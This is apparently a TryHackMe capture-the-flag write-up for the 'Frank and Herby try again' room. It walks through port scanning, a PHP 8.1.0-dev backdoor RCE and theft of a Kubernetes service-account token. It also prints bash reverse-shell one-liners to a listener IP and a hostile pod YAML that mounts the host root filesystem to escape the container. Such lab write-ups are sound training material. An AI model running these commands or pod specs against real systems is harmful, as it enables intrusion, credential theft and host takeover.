![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/5d3c3a65-e793-4e43-a8bc-d78fb5458446)

https://tryhackme.com/room/frankandherbytryagain

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

To begin the enumeration process, I conducted port and service scans using Rustscan:

```bash
sudo rustscan -a 10.10.175.146 -- -sC -sV -vv -oN result_nmap
```

Rustscan identified several open ports within the environment.

```Rust
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 99:bf:3f:0e:b2:95:0e:76:e5:0f:28:8a:e9:25:bd:b1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChoOOe3I9Ht5v0FymFzVpEq4xeHBDdq8Py0Yd4oNCbIcS28e6CLx8bCzhhHHqw2I2/+vhdlIj1AcwW/vASRHQqEdDNNY57GrM+Oa+O0gdv66jRw9ZREwD7VjQt8Ql1DLqWhZGHsTH06qdta2BsEzsd5ggc9iwVkt4VARKyyNrH4RoGFyDXunGXQmg1uYajiXDVEGnkMdyjoCeayd5dWbCc1KcbG5ZF/is62Nh+xFV5eKR7Z4HuvyrCe15gP+NnFEOf/tcU93v3o0NVW1ZjOTKGtue/dSz95iq0A6bEhcRjxgYZJNAgL9gCRoy9Qod1+c6p9NIW5ukmYj/hnqeyooexBFtQAxhzhYhwVElz6jjExUktlXHkFHRyXkIjIxPeK1WvXVr2uj/+LrVcwkq9JngOfDJ+Cwve/ZXmLOlVswr1wUR+Jn/noysrKKP0bYTiMo1Au1yO0NWlJ4H90JEjHQ6brpv56UgwE5n6om/yZ9lLh4Nog/Yj2KdcgfwTiaVx4A0=
|   256 df:48:b7:b2:a2:bc:5a:7e:f9:bb:b8:54:2a:98:03:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK3p0AWN289eLta3lUlj3UWvtGcdIN1QMeIFOKLinw7cy34fxhjXqA7barPIejPCCpWvkkojT7QKKtooGPb3TKw=
|   256 ad:09:e8:fd:58:3b:a1:3e:37:7e:62:d2:44:20:7a:f2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbF1S8zZY4qkuEnnU4p5SrEsstZ99cRBwkBYqJPjlKw
10250/tcp open  ssl/http    syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=microk8s@1647797913
| Subject Alternative Name: DNS:microk8s
| Issuer: commonName=microk8s-ca@1647797912
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-20T16:38:32
| Not valid after:  2023-03-20T16:38:32
| MD5:   4fd0 e33e 0fe5 18cb 3b59 b32f 26bb 4296
| SHA-1: d560 5617 ba2b 2fd6 5e75 8de8 aa04 d912 3d30 496e
| -----BEGIN CERTIFICATE-----
| MIIDJTCCAg2gAwIBAgIBAjANBgkqhkiG9w0BAQsFADAhMR8wHQYDVQQDDBZtaWNy
| b2s4cy1jYUAxNjQ3Nzk3OTEyMB4XDTIyMDMyMDE2MzgzMloXDTIzMDMyMDE2Mzgz
| MlowHjEcMBoGA1UEAwwTbWljcm9rOHNAMTY0Nzc5NzkxMzCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKutSnT1zV6PhNeD0uMhXGr7auoLYJt3Mz0zFMB8
| KkY3AFNJAso1HbSJXuXu8hnq2AAfWAVMs5yJrNvOmcYMRVmm6taos76SWxCgUw7P
| eXn55bquvhql8r4+R7VIWFNilwiw5I67Hvsr6miil3bZVYSO1c5kcA/2OHp2GJfe
| 2anUvnmV5Qzz8ghwpovGjZ/tRDWW0Mjbp/T5kUv1GOcj30t14GeLZ5eMSlFPQUR2
| seuUxnquhl9FeynuymnFo7gUTqgHm/PXh2IDFpUwLP5NS1MHVtvtEFJAMxAuLPME
| AqdyRdmYw2SkVn94JopyIO9+BKcQKt/d6e/ejMYyesTvlLECAwEAAaNrMGkwDgYD
| VR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAw
| HwYDVR0jBBgwFoAU7O7jxwBLPl/jQ+BibTGVukNTQEQwEwYDVR0RBAwwCoIIbWlj
| cm9rOHMwDQYJKoZIhvcNAQELBQADggEBAEYfbU8pEOyQV/XSaTvzPC2OVRaXp+Lv
| IzgNP+njHHhqKk2NqOyhbLCVP2NYfL2W+LM/ibP4oLlIUMGO2z+apAAEXeX8EFQx
| sxIF2xBff7PobzRJAftQCdbctpUZqfvxfxmOcTYlbkqvBf4x2qfcdcfoMtsk5GyY
| rLC1aq+RmmZ0My2avvcMNcqMEnxV3o9OxRPj1hOM9y1WYFiRWfhStvhyq6xqp6kC
| dGNbTL6UKZcDluadHHkvrkhkTeorA+OSWxwHWZw5qDEnNcpDYWJy54w+PjlmAdLk
| 2kNQJBn5tGuspvV6uRCig+5dodDCaCy006fb/7n8qX5vpBl6mU7sJLY=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10255/tcp open  http        syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Tue, 12 Dec 2023 10:51:02 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Tue, 12 Dec 2023 10:51:03 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1702378014
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=localhost-ca@1702378009
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-12T09:46:45
| Not valid after:  2024-12-11T09:46:45
| MD5:   f364 971c a126 de46 142e 40f7 5a65 762f
| SHA-1: 9b9f 3843 372d 4e26 1d71 dcb7 e845 3f05 7ef0 da3d
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAiMSAwHgYDVQQDDBdsb2Nh
| bGhvc3QtY2FAMTcwMjM3ODAwOTAeFw0yMzEyMTIwOTQ2NDVaFw0yNDEyMTEwOTQ2
| NDVaMB8xHTAbBgNVBAMMFGxvY2FsaG9zdEAxNzAyMzc4MDE0MIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1CqYckmRNtx5BuiV4lGnnNFnszZxDXsLDtpL
| aQPkSBokWnKeBHeV8uh1eQ0aMQYSNGx5ihsBqqXU6sYiwnY0RcQf47zY2cMDN1S8
| xsqurTS6KaHsXwkr3FZQy35CN6jLy4gftMz3yXhpGEIuwxm7GUYs47e3GxXmYmaC
| hp0SZJI5+KxHrwN4HgjuatwCqFHX/6XKyHbtXxRnLp1fZT4Undu42ECvWpwG92oK
| GAf4nLruZe3fegqnSyoBa5QD8aJ9cLbZDaYxGCslEU0jOd7eaW3ggXr0ux9gUOOq
| OqbZRyaG+4dp0yirGgE9ijWDlj6OdhcueaSSsuTIt0W2te0V5QIDAQABo30wezAO
| BgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIw
| ADAfBgNVHSMEGDAWgBRI28YI/mu0KpMaLcWZfURLER0egzAlBgNVHREEHjAcggls
| b2NhbGhvc3SCCWxvY2FsaG9zdIcEfwAAATANBgkqhkiG9w0BAQsFAAOCAQEAeeDY
| BpUCje+VUrK22drX/VkMvdTepe9Nz4Az2U/r1Sr+hmHwHWU0K44wGS1p0fO9ToG5
| 2N6MQk/93bzxyqj7PWX2uoxip/07JXaw52P5q2iFxSEedA/rpCWEC0iUE6n+kdWM
| hxwfxhbspYYpf0LiX+Kgew5+LO7Obo06JOCIU3ixshhFIe01i+S/Ub5MXweLmMy/
| sCtQQIYTu/vePDsyaRUN5BPrOnISpePIokY/1GDvFppwiYg9q/4mQVPr/ZXbBSVx
| hfsf+H8+rQgcZgBSWVyxI+wJBOGhqAzoliXCGZLWK6JU78NKj7N3E/LXofXxHXfV
| dIC+Rq9SX5XDcf5gpg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open  ssl/unknown syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Tue, 12 Dec 2023 10:51:02 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Tue, 12 Dec 2023 10:51:03 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1702378009
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=localhost-ca@1702378008
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-12T09:46:45
| Not valid after:  2024-12-11T09:46:45
| MD5:   1c55 0b85 06f2 e7e9 51e4 bdcc a8d2 6cd0
| SHA-1: 5ca6 39d4 adc3 91c9 c913 e3b7 8aff 59bf b480 136f
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAiMSAwHgYDVQQDDBdsb2Nh
| bGhvc3QtY2FAMTcwMjM3ODAwODAeFw0yMzEyMTIwOTQ2NDVaFw0yNDEyMTEwOTQ2
| NDVaMB8xHTAbBgNVBAMMFGxvY2FsaG9zdEAxNzAyMzc4MDA5MIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv6knLhuBDIQhQqMRgtzy+lEA93MdRe78r9g8
| 2MRw2LNN3YdeqS+dtWD4jGSXD+S/0OBnmN0zQ9H8223Db65fHNA9GJud5h0bcJks
| TYpC9RGoBtP3MM/7BbmgXYUmQ0ReiTgwvVPHv4r2qTmlafSNPK5ljPFq2Op53MO6
| UJjpcBFfnzojZA4ewMUm+wr9JBHRDGJsbtwsAS2s6oZHYRCIvB13O3gdtEHBVUMC
| drBzOIqN+zbCMr5OkuaSY6dvn/v4Anhmqmd6i+QDPxpiDX9+pMCxYenRYFTLbKJ9
| L09gSWD8qwDtBN7bESMIJjeiPtfxmzKJg/oDwGYKll6ROfM7PwIDAQABo30wezAO
| BgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIw
| ADAfBgNVHSMEGDAWgBSgEnCKw85e9931PUJ1O+2IpPeaVDAlBgNVHREEHjAcggls
| b2NhbGhvc3SCCWxvY2FsaG9zdIcEfwAAATANBgkqhkiG9w0BAQsFAAOCAQEAHWZT
| J8cvrwfNgBxv5NmAr4G2ZpEbEfANmSofuf1eHnGdvT5jCUfqhFCR+Qdw7Oh+GdUA
| Zi8cP9uWkQz/MTORAg8OlrcP/nbKYWqN3aR91B6b+FokhbK65UscUNyxBOSJJDmx
| ihTbCncjrKKYZR/6u9k+JwfFBAlG2ZiqWskTxwMEuURjUFVGbbywG+dZJOgmHuPQ
| XswWo5oNc/fhkVCBe4Ezd7Afgwmu2CBc1zLYQO081BfJSJpaNFAmEX1m5NOzyuT5
| 2q21b1/PZNT4Ifj4iMO8WMhLNRWvJoKrdpjDKCZV6F6WABcjDLUKVZbudiC0MyvI
| Q+S95eF5hSIpsIx99w==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
16443/tcp open  ssl/unknown syn-ack ttl 61
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: ebc6cd2b-9ba8-4035-b40c-8c197b282192
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 12 Dec 2023 10:51:41 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 1e7dee9b-1ee3-4919-bfaf-bbfd34ed20ed
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 12 Dec 2023 10:51:02 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 6f89d32c-fee7-440e-9a9e-c943b3b664af
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 12 Dec 2023 10:51:03 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB/localityName=Canonical/organizationalUnitName=Canonical
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.126.145
| Issuer: commonName=10.152.183.1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-12T10:45:50
| Not valid after:  2024-12-11T10:45:50
| MD5:   9f7f 1dc8 5604 8e3e 7589 f5e0 c574 9a4d
| SHA-1: 4dd0 daae b37a 7564 82ab 8f11 310c c60f f168 2c28
| -----BEGIN CERTIFICATE-----
| MIIERTCCAy2gAwIBAgIUJHo62dCzpXCUazy6UyPZDOdgKmowDQYJKoZIhvcNAQEL
| BQAwFzEVMBMGA1UEAwwMMTAuMTUyLjE4My4xMB4XDTIzMTIxMjEwNDU1MFoXDTI0
| MTIxMTEwNDU1MFowcTELMAkGA1UEBhMCR0IxEjAQBgNVBAgMCUNhbm9uaWNhbDES
| MBAGA1UEBwwJQ2Fub25pY2FsMRIwEAYDVQQKDAlDYW5vbmljYWwxEjAQBgNVBAsM
| CUNhbm9uaWNhbDESMBAGA1UEAwwJMTI3LjAuMC4xMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEApjpbG0i/g81UOCNSzxWEK3rIfnBhulzfikf/0xYMh50G
| vF7uOm8Vi4Tjy/gc7ftFBdOolwFlpFegfztRIwrLViTqfoUg5zLqXh6DROt3cbUo
| zOaeZUAXPzdocnrVo54WpWAJK23eePRAggFygEVdZdF6vz+miNTfhOgdNTODT4V8
| Cf+hbgbpB9rRjdz4jkrAG/oXM3MoheYp2oRQzoIf6pfz4XtaEt7PBPNBKtWs7xCX
| sXr38VBIQEjv3I4vhR38DGgMUIy8FFuJSlo451No9Y/yNgbtKpcdnsvq8O9gzpbA
| sNip0Y1f6HErRhtKDCosGPv2I8bH+zy9uxR3ZeHvgQIDAQABo4IBLTCCASkwUgYD
| VR0jBEswSYAUW9bvPh199LmBXIPFZtfFcp8pmsmhG6QZMBcxFTATBgNVBAMMDDEw
| LjE1Mi4xODMuMYIUSyIc0S1Mg3lPqiK4keqNfebw/3gwCQYDVR0TBAIwADALBgNV
| HQ8EBAMCBLAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMIGbBgNVHREE
| gZMwgZCCCmt1YmVybmV0ZXOCEmt1YmVybmV0ZXMuZGVmYXVsdIIWa3ViZXJuZXRl
| cy5kZWZhdWx0LnN2Y4Iea3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVygiRr
| dWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWyHBH8AAAGHBAqYtwGH
| BAoKfpEwDQYJKoZIhvcNAQELBQADggEBABTtaektBk2oWZY6Dxko9ZmeKAK3fo/H
| u8HtS+yVzQ6ark75ktr+i9dkkkH6/psnYfvm+BBe8IHmXXthOEvYo+//X5YinOwi
| ezegkBBV17gB/upA5uXz+VCJ2vqlV5QzwZGc6j1VOO5ZvKcV+fbjGSqvuj+Jd2Vt
| X0RvICZtpg6Sn+EzknTSO2IxOzfG4lv04iD52LL4CdFGN1aN777gVOMaCeznTzwg
| XBX8UTy3JE5j+9hvnxl1rnpAIybwiuJSFw3FeaHBmh4KwO7V0Tmv/tm+2a5uEgq1
| awbcGwIipHyntTmF2qexSoFBIRj8n51PzqRcHnZXuKFFpNOcMoGm+hk=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
25000/tcp open  ssl/http    syn-ack ttl 61 Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB/localityName=Canonical/organizationalUnitName=Canonical
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.126.145
| Issuer: commonName=10.152.183.1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-12T10:45:50
| Not valid after:  2024-12-11T10:45:50
| MD5:   9f7f 1dc8 5604 8e3e 7589 f5e0 c574 9a4d
| SHA-1: 4dd0 daae b37a 7564 82ab 8f11 310c c60f f168 2c28
| -----BEGIN CERTIFICATE-----
| MIIERTCCAy2gAwIBAgIUJHo62dCzpXCUazy6UyPZDOdgKmowDQYJKoZIhvcNAQEL
| BQAwFzEVMBMGA1UEAwwMMTAuMTUyLjE4My4xMB4XDTIzMTIxMjEwNDU1MFoXDTI0
| MTIxMTEwNDU1MFowcTELMAkGA1UEBhMCR0IxEjAQBgNVBAgMCUNhbm9uaWNhbDES
| MBAGA1UEBwwJQ2Fub25pY2FsMRIwEAYDVQQKDAlDYW5vbmljYWwxEjAQBgNVBAsM
| CUNhbm9uaWNhbDESMBAGA1UEAwwJMTI3LjAuMC4xMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEApjpbG0i/g81UOCNSzxWEK3rIfnBhulzfikf/0xYMh50G
| vF7uOm8Vi4Tjy/gc7ftFBdOolwFlpFegfztRIwrLViTqfoUg5zLqXh6DROt3cbUo
| zOaeZUAXPzdocnrVo54WpWAJK23eePRAggFygEVdZdF6vz+miNTfhOgdNTODT4V8
| Cf+hbgbpB9rRjdz4jkrAG/oXM3MoheYp2oRQzoIf6pfz4XtaEt7PBPNBKtWs7xCX
| sXr38VBIQEjv3I4vhR38DGgMUIy8FFuJSlo451No9Y/yNgbtKpcdnsvq8O9gzpbA
| sNip0Y1f6HErRhtKDCosGPv2I8bH+zy9uxR3ZeHvgQIDAQABo4IBLTCCASkwUgYD
| VR0jBEswSYAUW9bvPh199LmBXIPFZtfFcp8pmsmhG6QZMBcxFTATBgNVBAMMDDEw
| LjE1Mi4xODMuMYIUSyIc0S1Mg3lPqiK4keqNfebw/3gwCQYDVR0TBAIwADALBgNV
| HQ8EBAMCBLAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMIGbBgNVHREE
| gZMwgZCCCmt1YmVybmV0ZXOCEmt1YmVybmV0ZXMuZGVmYXVsdIIWa3ViZXJuZXRl
| cy5kZWZhdWx0LnN2Y4Iea3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVygiRr
| dWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWyHBH8AAAGHBAqYtwGH
| BAoKfpEwDQYJKoZIhvcNAQELBQADggEBABTtaektBk2oWZY6Dxko9ZmeKAK3fo/H
| u8HtS+yVzQ6ark75ktr+i9dkkkH6/psnYfvm+BBe8IHmXXthOEvYo+//X5YinOwi
| ezegkBBV17gB/upA5uXz+VCJ2vqlV5QzwZGc6j1VOO5ZvKcV+fbjGSqvuj+Jd2Vt
| X0RvICZtpg6Sn+EzknTSO2IxOzfG4lv04iD52LL4CdFGN1aN777gVOMaCeznTzwg
| XBX8UTy3JE5j+9hvnxl1rnpAIybwiuJSFw3FeaHBmh4KwO7V0Tmv/tm+2a5uEgq1
| awbcGwIipHyntTmF2qexSoFBIRj8n51PzqRcHnZXuKFFpNOcMoGm+hk=
|_-----END CERTIFICATE-----
30679/tcp open  http        syn-ack ttl 60 PHP cli server 5.5 or later (PHP 8.1.0-dev)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: FRANK RULEZZ!
```

I proceeded to manually inspect each port:

- Port 22: SSH
- Port 10250: microk8s
- Port 10255: Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/5dd54b4c-8aa3-42ef-95e9-ac49588790d2)

- Port 10257:
- Port 10259:
- Port 16443: kubernetes
- Port 25000: Gunicorn 19.7.1
- Port 30679: PHP cli server 5.5 or later (PHP 8.1.0-dev)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/47f733cd-6e24-47b0-8cea-392c0ae6a7be)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Initial access:

Upon inspecting the discovered ports, I noticed that port 30679 is running a PHP server with version 8.1.0. I searched for potential exploits and found a Remote Code Execution (RCE) exploit on exploit-db.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1b2ec74f-2717-445a-9135-5439d775d096)

Utilizing this exploit, I confirmed that I could execute commands on the PHP host:

```bash
python3 php-exploit.py
hostname
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/bbeb1c0c-3a3b-4d65-a90d-7d344cef64fa)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b7bf4de3-7856-4738-b35b-781008aefa80)

Subsequently, I initiated a bash reverse shell, successfully establishing a connection on my netcat listener:

```bash
bash -c "bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f319a4b6-2e1d-4975-bbb7-24ae87066c6b)

Although I gained a reverse shell as root, further manual exploration indicated that I was inside a virtual environment. Upon additional investigation, it became evident that I was within a Kubernetes pod:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9375898e-6afd-4fce-972b-d8f81b68a749)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## K8s:

To obtain the user flag and escape the virtual environment, I performed manual enumeration for certificates and tokens. I referred to [Hacktrickz Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration) to identify potential locations for secrets and tokens. According to the blog, these can be found in the following directories:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ab97a5e6-1586-4113-a4cf-e31b1170e8f9)

Upon checking these locations, I found certificates, namespaces, and tokens inside the "**/var/run/secrets/kubernetes.io/serviceaccount**" directory:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/53ecef96-2277-4818-a532-55fbabb7b495)

These certificates and tokens belong to the "frankland" namespace, as indicated in the namespace file.

I copied these certificate and token files to my localhost for further authentication and also exported the token value to the environment variable to avoid manual copy-pasting:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/068b6f0d-c86e-4908-a3be-97bb6cb64d11)

I used [Kubeletctl](https://github.com/cyberark/kubeletctl) to check for pods and namespaces on the target host. This also showed a POD namespace named "frankland":

```bash
kubeletctl pods -s 10.10.32.152 --http --port 10255
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f1bfd298-7300-45b5-acb3-cdca2a965d23)

Further enumeration within this POD allowed me to check if I could list or create new PODs in the Kubernetes cluster:

```bash
kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token auth can-i --list -n frankland  #Get privileves in custnamespace
kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get deployments -n frankland
kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get services -n frankland
kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get pods -n frankland
kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get nodes
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/48efc1cd-8b2f-4a7a-af3c-e1742e887d96)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/a2985248-308d-4831-b962-1ee75cdc0580)

By exploring the POD in the **frankland** namespace, it seems that I have the privilege to create a new POD with an already available image. To leverage this, I checked further details of the "frankland" namespace in YAML format to obtain the image name:

```bash
kubectl --server https://10.10.32.152:16443 --certificate-authority=ca.crt --token=$token get pod php-deploy-6d998f68b9-wlslz -n frankland -o yaml #list the POD details in yaml format.
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/facfffde-166b-4cef-86ba-6aa3b1e02bcf)

From this POD details, I obtained the image name as **vulhub/php:8.1-backdoor**. Using the image name, I created a new malicious YAML file that would mount the '/' folder in '/mnt' directory and also connect back to the netcat listener. My final YAML file looked like this:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kill3r1 #pod will be get created with this name
  namespace: default
spec:
  containers:
  - name: kill3r1
    image: vulhub/php:8.1-backdoor  #same image name for the pod frankland
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"]  #this will execute the bash reverse shell
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Once the YAML file was ready, I pushed it for creation. After a few moments, once the POD was created from my YAML file, I received a reverse shell in my listener:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ad50751d-eeb7-42c4-9c27-385c8bc6b2b5)

Although I received the reverse shell, I confirmed my POD creation using kubeletctl, which listed my malicious POD in the output:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1146036d-5640-4209-b377-b3176b2b7312)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Flags:

After gaining access through the reverse shell, I navigated to the **/mnt** directory, which contains files from the root host. In the process, I located the user flag within the **/home/herby** folder and the root flag within the **/root** directory.

**User flag:**

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/69f1cd38-9055-40fc-9196-2f2e19d3e54c)

**Root flag:**

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/27261a39-e43e-4d26-bc9d-6c3890176cc3)
